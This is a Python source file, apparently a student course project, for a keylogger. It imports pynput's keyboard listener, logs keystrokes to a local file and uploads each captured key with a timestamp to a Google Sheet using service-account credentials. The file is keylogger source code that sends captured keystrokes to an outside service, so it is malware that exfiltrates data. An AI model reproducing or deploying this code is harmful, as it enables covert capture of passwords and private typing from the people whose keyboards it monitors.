import logging
import math
import os
import sys
from datetime import datetime
import gspread
import numpy as np
from oauth2client.service_account import ServiceAccountCredentials
from pynput.keyboard import Key, Listener

"""
Manages all DB or Spreadsheet Operations to store and retreive the Keys
"""

log_dir = ""
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

scope = ['https://spreadsheets.google.com/feeds', 'https://www.googleapis.com/auth/drive']
creds = ServiceAccountCredentials.from_json_keyfile_name('client_secret.json', scope)
client = gspread.authorize(creds)
sheet = client.open("CSE3501 - Key Log Data").sheet1
record_count = len(sheet.get_all_records())


def uploadToDatabase(key):
    global record_count
    if record_count==0:
        sheet.insert_row(["Timestamp", "Key"], 1)
    index = record_count + 2
    now = datetime.now()
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    row = [dt_string, key]
    sheet.insert_row(row, index)
    record_count += 1
    # print("Uploading to database: ", end=" ")
    # print(row)
    # print(index)